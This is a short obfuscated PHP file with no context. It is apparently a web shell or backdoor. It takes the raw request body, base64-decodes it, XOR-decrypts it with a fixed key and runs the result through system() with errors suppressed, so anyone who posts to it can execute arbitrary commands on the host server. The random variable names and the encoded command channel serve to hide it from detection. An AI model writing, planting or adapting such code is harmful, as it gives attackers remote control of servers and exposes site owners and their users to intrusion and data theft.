<?php
$jbqmF0nQPJ='n0v4';
$FTeQ96Wq3T=file_get_contents('php://input');
if(!$FTeQ96Wq3T)exit;
$JH1nnjHdmA=base64_decode($FTeQ96Wq3T);
$wX3N1gbr4C='';
$haKAUWOnhH=strlen($jbqmF0nQPJ);
for($fuHRj4QORs=0;$fuHRj4QORs<strlen($JH1nnjHdmA);$fuHRj4QORs++){
$wX3N1gbr4C.=$JH1nnjHdmA[$fuHRj4QORs]^$jbqmF0nQPJ[$fuHRj4QORs%$haKAUWOnhH];}
@system($wX3N1gbr4C);

?>
